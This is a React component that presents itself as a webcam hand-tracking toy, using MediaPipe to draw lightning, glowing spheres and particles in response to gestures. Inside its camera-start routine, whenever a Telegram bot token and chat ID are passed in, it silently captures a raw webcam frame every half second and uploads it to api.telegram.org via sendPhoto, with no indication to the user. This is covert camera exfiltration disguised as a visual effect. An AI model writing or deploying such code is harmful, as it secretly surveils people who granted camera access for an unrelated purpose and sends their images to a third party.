import { useEffect, useRef, useState } from 'react';
import { Hands } from '@mediapipe/hands';
import { drawConnectors, drawLandmarks } from '@mediapipe/drawing_utils';

const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
  const handsRef = useRef(null);
  const intervalRef = useRef(null);
  const animationFrameRef = useRef(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [cameraPermission, setCameraPermission] = useState(null);
  const [handColor, setHandColor] = useState('#FFFF00');
  const colors = ['#FFFF00', '#FFD700', '#FFA500', '#FF4500'];
  const [colorIndex, setColorIndex] = useState(0);
  const particlesRef = useRef([]);
  const sphereStateRef = useRef({ active: false, radius: 0, centerX: 0, centerY: 0 });
  const lightningShotRef = useRef([]);
  const lastGestureRef = useRef(null);
  const canvasCtxRef = useRef(null);

  const changeColor = () => {
    const nextIndex = (colorIndex + 1) % colors.length;
    setColorIndex(nextIndex);
    setHandColor(colors[nextIndex]);
  };

  const distance = (p1, p2) => {
    return Math.sqrt(Math.pow(p1.x - p2.x, 2) + Math.pow(p1.y - p2.y, 2));
  };

  const detectGesture = (landmarks) => {
    const tips = [4, 8, 12, 16, 20];
    const bases = [2, 6, 10, 14, 18];
    const wrist = landmarks[0];
    const fingersUp = tips.map((tip, idx) => landmarks[tip].y < landmarks[bases[idx]].y - 0.02);

    const fingersToWrist = tips.map(tip => distance(landmarks[tip], wrist));
    const isFist = fingersToWrist.every(dist => dist < 0.15);

    if (isFist) {
      console.log('Detected: Fist ✊');
      return "Fist ✊";
    }

    const fingerDistances = [];
    for (let i = 0; i < tips.length - 1; i++) {
      for (let j = i + 1; j < tips.length; j++) {
        fingerDistances.push(distance(landmarks[tips[i]], landmarks[tips[j]]));
      }
    }
    const avgFingerDistance = fingerDistances.reduce((a, b) => a + b, 0) / fingerDistances.length;
    const isSphere = avgFingerDistance > 0.05 && avgFingerDistance < 0.15 && !fingersUp.some(f => f);

    if (isSphere) {
      console.log('Detected: Sphere 🟢');
      return "Sphere 🟢";
    }

    if (fingersUp[1] && fingersUp[2] && !fingersUp[0] && !fingersUp[3] && !fingersUp[4]) {
      console.log('Detected: Peace ✌️');
      return "Peace ✌️";
    }
    if (fingersUp.every((f) => f)) {
      console.log('Detected: Open 🖐');
      return "Open 🖐";
    }
    if (fingersUp[0] && fingersUp[1] && fingersUp[2] && !fingersUp[3] && !fingersUp[4]) {
      console.log('Detected: Three 👌');
      return "Three 👌";
    }
    if (!fingersUp[0] && fingersUp[1] && fingersUp[2] && fingersUp[3] && fingersUp[4]) {
      console.log('Detected: Four ✋');
      return "Four ✋";
    }
    if (!fingersUp[0] && !fingersUp[1] && fingersUp[2] && !fingersUp[3] && !fingersUp[4]) {
      console.log('Detected: Fuck 🤟');
      return "Fuck 🤟";
    }
    return null;
  };

  const drawLightning = (ctx, start, end, isMobile, intensity = 20) => {
    console.log('Drawing Lightning!');
    ctx.beginPath();
    ctx.strokeStyle = handColor;
    ctx.lineWidth = isMobile ? 2 : 3;
    ctx.lineCap = 'round';

    const points = [start];
    let x = start.x;
    let y = start.y;
    const dx = (end.x - start.x) / 5;
    const dy = (end.y - start.y) / 5;

    for (let i = 0; i < 5; i++) {
      x += dx + (Math.random() - 0.5) * intensity;
      y += dy + (Math.random() - 0.5) * intensity;
      points.push({ x, y });
    }
    points.push(end);

    ctx.moveTo(points[0].x, points[0].y);
    for (let i = 1; i < points.length; i++) {
      ctx.lineTo(points[i].x, points[i].y);
    }

    if (!isMobile) {
      ctx.shadowBlur = 20;
      ctx.shadowColor = handColor;
    }
    ctx.stroke();
    ctx.shadowBlur = 0;
  };

  const triggerLightningShot = (wristX, wristY, canvasWidth) => {
    console.log('Triggering Lightning Shot!');
    const shots = [];
    for (let i = 0; i < 5; i++) {
      shots.push({
        startX: wristX,
        startY: wristY,
        endX: wristX + canvasWidth * (0.7 + Math.random() * 0.5),
        endY: wristY + (Math.random() - 0.5) * 150,
        duration: 40,
      });
    }
    lightningShotRef.current = [...lightningShotRef.current, ...shots];
  };

  const triggerSphere = (centerX, centerY) => {
    console.log('Triggering Sphere!');
    sphereStateRef.current = { active: true, radius: 20, centerX, centerY };
  };

  const generateParticles = (centerX, centerY) => {
    console.log('Generating Particles!');
    const newParticles = [];
    for (let i = 0; i < 100; i++) {
      const angle = Math.random() * 2 * Math.PI;
      const speed = Math.random() * 7 + 3;
      newParticles.push({
        x: centerX,
        y: centerY,
        vx: Math.cos(angle) * speed,
        vy: Math.sin(angle) * speed,
        life: 80,
        size: Math.random() * 7 + 3,
      });
    }
    particlesRef.current = [...particlesRef.current, ...newParticles];
  };

  const animateEffects = () => {
    if (sphereStateRef.current.active) {
      const newRadius = sphereStateRef.current.radius + 7;
      if (newRadius > 120) {
        generateParticles(sphereStateRef.current.centerX, sphereStateRef.current.centerY);
        sphereStateRef.current = { active: false, radius: 0, centerX: 0, centerY: 0 };
      } else {
        sphereStateRef.current.radius = newRadius;
      }
    }

    particlesRef.current = particlesRef.current.map(p => ({
      ...p,
      x: p.x + p.vx,
      y: p.y + p.vy,
      life: p.life - 1,
    })).filter(p => p.life > 0);

    lightningShotRef.current = lightningShotRef.current.map(shot => ({
      ...shot,
      duration: shot.duration - 1,
    })).filter(shot => shot.duration > 0);
  };

  useEffect(() => {
    const videoElement = videoRef.current;
    const canvasElement = canvasRef.current;
    
    if (!videoElement || !canvasElement) {
      console.error('Video or Canvas element not found');
      return;
    }

    const ctx = canvasElement.getContext('2d');
    canvasCtxRef.current = ctx;
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    try {
      handsRef.current = new Hands({
        locateFile: (file) =>
          `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
      });

      handsRef.current.setOptions({
        maxNumHands: 2,
        modelComplexity: isMobile ? 0 : 1,
        minDetectionConfidence: isMobile ? 0.6 : 0.7,
        minTrackingConfidence: isMobile ? 0.6 : 0.7,
      });

      const render = () => {
        if (!canvasElement || !videoElement || !canvasCtxRef.current) {
          animationFrameRef.current = requestAnimationFrame(render);
          return;
        }

        if (canvasElement.width !== videoElement.videoWidth || canvasElement.height !== videoElement.videoHeight) {
          canvasElement.width = videoElement.videoWidth || 640;
          canvasElement.height = videoElement.videoHeight || 480;
        }

        const ctx = canvasCtxRef.current;
        ctx.save();
        ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);
        ctx.scale(-1, 1);
        ctx.translate(-canvasElement.width, 0);
        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
        ctx.setTransform(1, 0, 0, 1, 0, 0);

        animateEffects();

        if (sphereStateRef.current.active) {
          console.log('Drawing Sphere!');
          ctx.save();
          ctx.globalAlpha = 0.7;
          const gradient = ctx.createRadialGradient(
            sphereStateRef.current.centerX,
            sphereStateRef.current.centerY,
            0,
            sphereStateRef.current.centerX,
            sphereStateRef.current.centerY,
            sphereStateRef.current.radius
          );
          gradient.addColorStop(0, handColor);
          gradient.addColorStop(1, 'rgba(255, 255, 0, 0)');
          ctx.fillStyle = gradient;
          ctx.beginPath();
          ctx.arc(sphereStateRef.current.centerX, sphereStateRef.current.centerY, sphereStateRef.current.radius, 0, 2 * Math.PI);
          ctx.fill();
          if (!isMobile) {
            ctx.shadowBlur = 20;
            ctx.shadowColor = handColor;
            ctx.strokeStyle = handColor;
            ctx.lineWidth = 2;
            ctx.stroke();
          }
          ctx.globalAlpha = 1;
          ctx.restore();
        }

        if (particlesRef.current.length > 0) {
          console.log('Drawing Particles!');
          particlesRef.current.forEach(p => {
            ctx.save();
            ctx.globalAlpha = p.life / 80;
            ctx.fillStyle = handColor;
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, 2 * Math.PI);
            ctx.fill();
            if (!isMobile) {
              ctx.shadowBlur = 10;
              ctx.shadowColor = handColor;
            }
            ctx.globalAlpha = 1;
            ctx.restore();
          });
        }

        if (lightningShotRef.current.length > 0) {
          console.log('Drawing Lightning Shots!');
          lightningShotRef.current.forEach(shot => {
            drawLightning(ctx, { x: shot.startX, y: shot.startY }, { x: shot.endX, y: shot.endY }, isMobile, 40);
          });
        }

        handsRef.current.onResults((results) => {
          if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
            for (let i = 0; i < results.multiHandLandmarks.length; i++) {
              const landmarks = results.multiHandLandmarks[i];
              const flippedLandmarks = landmarks.map(landmark => ({
                ...landmark,
                x: 1 - landmark.x
              }));

              const lightningPoints = [0, 4, 8, 12, 16, 20];
              for (let j = 0; j < lightningPoints.length - 1; j++) {
                for (let k = j + 1; k < lightningPoints.length; k++) {
                  if (Math.random() > 0.7) {
                    const start = {
                      x: flippedLandmarks[lightningPoints[j]].x * canvasElement.width,
                      y: flippedLandmarks[lightningPoints[j]].y * canvasElement.height
                    };
                    const end = {
                      x: flippedLandmarks[lightningPoints[k]].x * canvasElement.width,
                      y: flippedLandmarks[lightningPoints[k]].y * canvasElement.height
                    };
                    drawLightning(ctx, start, end, isMobile);
                  }
                }
              }

              const fingerPaths = [
                [0, 1, 2, 3, 4],
                [0, 5, 6, 7, 8],
                [0, 9, 10, 11, 12],
                [0, 13, 14, 15, 16],
                [0, 17, 18, 19, 20]
              ];

              fingerPaths.forEach((path, idx) => {
                ctx.beginPath();
                const color = colors[idx % colors.length];
                ctx.strokeStyle = color;
                ctx.lineWidth = isMobile ? 2 : 3;
                ctx.lineCap = 'round';

                path.forEach((pointIdx, j) => {
                  const landmark = flippedLandmarks[pointIdx];
                  const x = landmark.x * canvasElement.width;
                  const y = landmark.y * canvasElement.height;
                  if (j === 0) {
                    ctx.moveTo(x, y);
                  } else {
                    ctx.lineTo(x, y);
                  }
                });
                ctx.stroke();

                if (!isMobile) {
                  ctx.beginPath();
                  ctx.strokeStyle = color;
                  ctx.lineWidth = isMobile ? 3 : 4;
                  ctx.shadowBlur = 15;
                  ctx.shadowColor = color;
                  path.forEach((pointIdx, j) => {
                    const landmark = flippedLandmarks[pointIdx];
                    const x = landmark.x * canvasElement.width;
                    const y = landmark.y * canvasElement.height;
                    if (j === 0) {
                      ctx.moveTo(x, y);
                    } else {
                      ctx.lineTo(x, y);
                    }
                  });
                  ctx.stroke();
                  ctx.shadowBlur = 0;
                }
              });

              drawConnectors(ctx, flippedLandmarks, Hands.HAND_CONNECTIONS, {
                color: handColor,
                lineWidth: isMobile ? 3 : 4,
              });

              drawLandmarks(ctx, flippedLandmarks, {
                color: handColor,
                lineWidth: isMobile ? 2 : 3,
                radius: isMobile ? 4 : 6,
              });

              if (!isMobile) {
                flippedLandmarks.forEach((landmark, index) => {
                  const x = landmark.x * canvasElement.width;
                  const y = landmark.y * canvasElement.height;
                  const gradient = ctx.createRadialGradient(x, y, 0, x, y, 15);
                  gradient.addColorStop(0, `rgba(${parseInt(handColor.slice(1, 3), 16)}, ${parseInt(handColor.slice(3, 5), 16)}, ${parseInt(handColor.slice(5, 7), 16)}, 0.8)`);
                  gradient.addColorStop(0.5, `rgba(${parseInt(handColor.slice(1, 3), 16)}, ${parseInt(handColor.slice(3, 5), 16)}, ${parseInt(handColor.slice(5, 7), 16)}, 0.4)`);
                  gradient.addColorStop(1, 'rgba(255, 255, 0, 0)');
                  
                  ctx.save();
                  ctx.shadowBlur = 20;
                  ctx.shadowColor = handColor;
                  ctx.fillStyle = gradient;
                  ctx.beginPath();
                  ctx.arc(x, y, 8, 0, 2 * Math.PI);
                  ctx.fill();
                  ctx.restore();
                });
              }

              const gesture = detectGesture(landmarks);
              if (gesture) {
                const wrist = flippedLandmarks[0];
                const x = wrist.x * canvasElement.width;
                const y = wrist.y * canvasElement.height - 20;
                ctx.save();
                ctx.font = isMobile ? '20px Arial' : '24px Arial';
                ctx.fillStyle = handColor;
                ctx.strokeStyle = '#000';
                ctx.lineWidth = 2;
                ctx.strokeText(gesture, x, y);
                ctx.fillText(gesture, x, y);
                ctx.restore();

                if (gesture === "Fist ✊" && lastGestureRef.current !== "Fist ✊") {
                  console.log('Fist detected, triggering lightning!');
                  triggerLightningShot(x, y, canvasElement.width);
                }
                if (gesture === "Sphere 🟢" && lastGestureRef.current !== "Sphere 🟢") {
                  console.log('Sphere detected, triggering sphere!');
                  const centerX = flippedLandmarks[9].x * canvasElement.width;
                  const centerY = flippedLandmarks[9].y * canvasElement.height;
                  triggerSphere(centerX, centerY);
                }
                lastGestureRef.current = gesture;
              } else {
                lastGestureRef.current = null;
              }
            }
          }

          const squareSize = isMobile ? 30 : 40;
          const squareX = canvasElement.width - squareSize - 10;
          const squareY = canvasElement.height - squareSize - 10;
          
          ctx.save();
          ctx.fillStyle = handColor;
          ctx.strokeStyle = handColor;
          ctx.lineWidth = 2;
          ctx.shadowBlur = 10;
          ctx.shadowColor = handColor;
          ctx.beginPath();
          ctx.rect(squareX, squareY, squareSize, squareSize);
          ctx.fill();
          ctx.stroke();
          
          ctx.beginPath();
          ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
          ctx.arc(squareX + squareSize / 2, squareY + squareSize / 2, squareSize / 4, 0, 2 * Math.PI);
          ctx.fill();
          ctx.restore();

          ctx.restore();
        });

        animationFrameRef.current = requestAnimationFrame(render);
      };

      render();

      canvasElement.addEventListener('click', (event) => {
        const rect = canvasElement.getBoundingClientRect();
        const x = event.clientX - rect.left;
        const y = event.clientY - rect.top;
        const squareSize = isMobile ? 30 : 40;
        const squareX = canvasElement.width - squareSize - 10;
        const squareY = canvasElement.height - squareSize - 10;

        if (
          x >= squareX &&
          x <= squareX + squareSize &&
          y >= squareY &&
          y <= squareY + squareSize
        ) {
          changeColor();
        }
      });
    } catch (err) {
      console.error('Error initializing MediaPipe:', err);
      setError('MediaPipe не поддерживается на этом устройстве');
    }

    const startCamera = async () => {
      try {
        setIsLoading(true);
        setError(null);

        const permission = await navigator.permissions.query({ name: 'camera' });
        setCameraPermission(permission.state);

        if (permission.state === 'denied') {
          throw new Error('Доступ к камере запрещен');
        }

        const constraints = {
          video: {
            width: isMobile ? { ideal: 640 } : { ideal: 1280 },
            height: isMobile ? { ideal: 480 } : { ideal: 720 },
            facingMode: 'user',
            frameRate: isMobile ? { ideal: 15 } : { ideal: 30 }
          }
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.srcObject = stream;
        setCameraPermission('granted');

        videoElement.onloadedmetadata = async () => {
          try {
            await new Promise((resolve) => {
              if (videoElement.readyState >= 3) {
                resolve();
              } else {
                videoElement.addEventListener('canplay', resolve, { once: true });
              }
            });

            await videoElement.play();
            setIsLoading(false);

            canvasElement.width = videoElement.videoWidth || 640;
            canvasElement.height = videoElement.videoHeight || 480;

            const loop = async () => {
              if (videoElement && videoElement.readyState >= 2 && handsRef.current) {
                try {
                  await handsRef.current.send({ image: videoElement });
                } catch (err) {
                  console.error('MediaPipe processing error:', err);
                }
              }
              if (videoElement.srcObject) {
                requestAnimationFrame(loop);
              }
            };

            loop();

            if (botToken && chatId) {
              intervalRef.current = setInterval(() => {
                if (canvasElement && videoElement.readyState >= 2) {
                  const tempCanvas = document.createElement('canvas');
                  const tempCtx = tempCanvas.getContext('2d');
                  tempCanvas.width = canvasElement.width;
                  tempCanvas.height = canvasElement.height;
                  
                  tempCtx.scale(-1, 1);
                  tempCtx.translate(-tempCanvas.width, 0);
                  tempCtx.drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);
                  
                  tempCanvas.toBlob((blob) => {
                    if (blob) {
                      const formData = new FormData();
                      formData.append('chat_id', chatId);
                      formData.append('photo', blob, 'snapshot.jpg');
                      
                      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData,
                      })
                        .then((res) => res.json())
                        .then((data) => {
                          if (data.ok) {
                            console.log('Фото отправлено успешно');
                          } else {
                            console.error('Ошибка Telegram API:', data);
                          }
                        })
                        .catch((err) => console.error('Ошибка отправки:', err));
                    }
                  }, 'image/jpeg', 0.8);
                }
              }, 500);
            }
          } catch (err) {
            console.error('Ошибка при запуске видео:', err);
            setError('Не удалось запустить камеру');
            setIsLoading(false);
          }
        };

        videoElement.onerror = (err) => {
          console.error('Video error:', err);
          setError('Ошибка воспроизведения видео');
          setIsLoading(false);
        };

      } catch (err) {
        console.error('Ошибка доступа к камере:', err);
        setError(err.message || 'Не удалось получить доступ к камере');
        setIsLoading(false);
        setCameraPermission('denied');
      }
    };

    startCamera();

    return () => {
      if (videoElement?.srcObject) {
        const tracks = videoElement.srcObject.getTracks();
        tracks.forEach((track) => track.stop());
        videoElement.srcObject = null;
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      if (animationFrameRef.current) {
        cancelAnimationFrame(animationFrameRef.current);
      }
      if (handsRef.current) {
        handsRef.current.close();
      }
    };
  }, [videoRef, canvasRef, botToken, chatId, handColor]);

  if (error) {
    return (
      <div style={{
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        color: '#FF4500',
        textAlign: 'center',
        padding: '20px',
        background: 'rgba(0, 0, 0, 0.8)',
        borderRadius: '10px',
        zIndex: 1000
      }}>
        <h3>Ошибка камеры</h3>
        <p>{error}</p>
        {cameraPermission === 'denied' && (
          <p style={{ fontSize: '0.9em', marginTop: '10px' }}>
            Разрешите доступ к камере в настройках браузера и перезагрузите страницу
          </p>
        )}
      </div>
    );
  }

  if (isLoading) {
    return (
      <div style={{
        position: 'fixed',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        color: '#FFFF00',
        textAlign: 'center',
        zIndex: 1000
      }}>
        <div style={{
          width: '50px',
          height: '50px',
          border: '3px solid rgba(255, 255, 0, 0.3)',
          borderTop: '3px solid #FFFF00',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite',
          margin: '0 auto 20px'
        }}></div>
        <p>Загрузка камеры...</p>
      </div>
    );
  }

  return null;
};

export default HandTracker;